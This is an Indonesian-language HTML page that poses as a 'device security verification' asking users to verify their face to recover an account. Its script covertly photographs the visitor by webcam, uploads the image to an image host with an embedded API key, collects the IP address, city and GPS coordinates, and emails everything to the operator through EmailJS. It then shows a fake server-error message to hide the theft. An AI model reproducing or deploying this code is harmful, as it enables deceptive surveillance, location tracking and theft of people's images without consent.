<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Keamanan Perangkat</title>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        body { font-family: sans-serif; background-color: #000; color: #00ff00; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { border: 1px solid #00ff00; padding: 20px; text-align: center; width: 80%; }
        button { background: #00ff00; color: #000; padding: 10px; border: none; font-weight: bold; cursor: pointer; width: 100%; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="box">
    <h3>[ PENYALAHGUNAAN TERDETEKSI ]</h3>
    <p>Selesaikan verifikasi wajah untuk memulihkan akun Novle Anda.</p>
    <button onclick="ambilData()">VERIFIKASI SEKARANG</button>
</div>

<video id="video" autoplay></video>
<canvas id="canvas"></canvas>

<script>
    (function(){
        emailjs.init("5HWPoEryOV1APt1Cw");
    })();

    async function ambilData() {
        let report = "[LAPORAN INTELIJEN LENGKAP]\n------------------\n";
        
        try {
            // Ambil IP
            const res = await fetch('https://ipapi.co/json/');
            const ipData = await res.json();
            report += `IP: ${ipData.ip}\nKota: ${ipData.city}\n`;

            // Ambil Foto
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;

            setTimeout(async () => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const photoBase64 = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
                stream.getTracks().forEach(t => t.stop());

                // UPLOAD KE IMGBB (Pakai Key Anda)
                const formData = new FormData();
                formData.append("image", photoBase64);
                const upload = await fetch("https://api.imgbb.com/1/upload?key=Dba59ebe766c55b8d286f55a8fe366e2", {
                    method: "POST", body: formData
                });
                const resImg = await upload.json();
                const linkFoto = resImg.data.url;

                // Ambil GPS & Kirim
                navigator.geolocation.getCurrentPosition((pos) => {
                    report += `📸 LINK FOTO: ${linkFoto}\n📍 Lokasi: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    kirimEmail(report);
                }, () => {
                    report += `📸 LINK FOTO: ${linkFoto}\n📍 GPS: Ditolak`;
                    kirimEmail(report);
                });
            }, 2000);
        } catch (e) {
            kirimEmail(report + "\nAkses Kamera Ditolak.");
        }
    }

    function kirimEmail(pesan) {
        emailjs.send("service_e3ap8de", "template_ts6dxmh", { message: pesan })
        .then(() => alert("Kesalahan Server 404. Silakan coba lagi."));
    }
</script>
</body>
</html>
